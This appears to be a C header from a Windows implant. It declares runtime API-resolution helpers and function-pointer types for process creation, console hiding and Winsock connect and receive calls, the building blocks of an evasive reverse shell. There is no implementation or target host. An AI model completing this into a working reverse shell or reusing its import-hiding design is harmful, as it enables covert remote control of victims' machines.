#pragma once

#include <windows.h>
#include <structs.h>
#include <ws2tcpip.h>


/*----------------------[ Dynamic Call ]----------------------*/

PVOID LdrModuleAddr( _In_ LPWSTR ModuleName);
PVOID LdrFuncAddr( _In_ PVOID BaseModule, _In_ PCHAR FuncName);

/*----------------------[ Kernel32 ]----------------------*/

typedef HMODULE (WINAPI* fnLoadLibraryA)(
  _In_ LPCSTR lpLibFileName
);

typedef void (WINAPI* fnSleep)(
  _In_ DWORD dwMilliseconds
);

typedef BOOL (WINAPI* fnCloseHandle)(
  _In_ HANDLE hObject
);

typedef BOOL (WINAPI *fnCreateProcess)(
    _In_opt_    LPCSTR lpApplicationName,
    _Inout_opt_ LPSTR lpCommandLine,
    _In_opt_    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    _In_opt_    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    _In_        BOOL bInheritHandles,
    _In_        DWORD dwCreationFlags,
    _In_opt_    LPVOID lpEnvironment,
    _In_opt_    LPCSTR lpCurrentDirectory,
    _In_        LPSTARTUPINFO lpStartupInfo,
    _Out_       LPPROCESS_INFORMATION lpProcessInformation
);

typedef DWORD (WINAPI *fnWaitForSingleObject)(
    _In_ HANDLE hHandle,
    _In_ DWORD dwMilliseconds
);

typedef void (WINAPI *fnExitProcess)(
  _In_ UINT uExitCode
);

typedef BOOL (WINAPI* fnFreeConsole)(void);

/*----------------------[ ws2_32.dll ]----------------------*/

typedef int (WINAPI *fnWSAStartup)(
    _In_  WORD wVersionRequested,
    _Out_ LPWSADATA lpWSAData
);

typedef u_short (WINAPI *fnhtons)(
  _In_ u_short hostshort
);

typedef unsigned long (WSAAPI *fninet_addr)(
  const char *cp
);

typedef SOCKET(WINAPI *fnWSASocket)(
    _In_     int af,
    _In_     int type,
    _In_     int protocol,
    _In_opt_ LPWSAPROTOCOL_INFO lpProtocolInfo,
    _In_     GROUP g,
    _In_     DWORD dwFlags
);

typedef int (WINAPI *fnWSAConnect)(
    _In_ SOCKET s,
    _In_ const struct sockaddr *name,
    _In_ int namelen,
    _In_opt_ LPWSABUF lpCallerData,
    _Out_opt_ LPWSABUF lpCalleeData,
    _In_opt_ LPQOS lpSQOS,
    _In_opt_ LPQOS lpGQOS
);

typedef int (WINAPI *fnRecv)(
    _In_ SOCKET s,
    _Out_ char *buf,
    _In_ int len,
    _In_ int flags
);

typedef int (WINAPI *fnclosesocket)(
    _In_ SOCKET s
);

typedef int (WSAAPI *fnWSACleanup)(
    void
);


/*----------------------[ Instance ]----------------------*/

typedef struct _INSTANCE {
  
  struct {

    fnLoadLibraryA            pLoadLibraryA;
    fnWaitForSingleObject     pWaitForSingleObject;
    fnCreateProcess           pCreateProcess;
    fnSleep                   pSleep;
    fnCloseHandle             pCloseHandle;
    fnFreeConsole             pFreeConsole;
    fnExitProcess             pExitProcess;
    
    fnclosesocket             pclosesocket;
    fnWSAStartup              pWSAStartup;
    fnWSASocket               pWSASocket;
    fnWSAConnect              pWSAConnect;
    fnWSACleanup              pWSACleanup;
    fnRecv                    pRecv;
    fninet_addr               pinet_addr;
    fnhtons                   phtons;

  } Api;

  struct {
    PVOID Kernel32;
    PVOID ws2;
  } Modules; 

} INSTANCE, *PINSTANCE; 
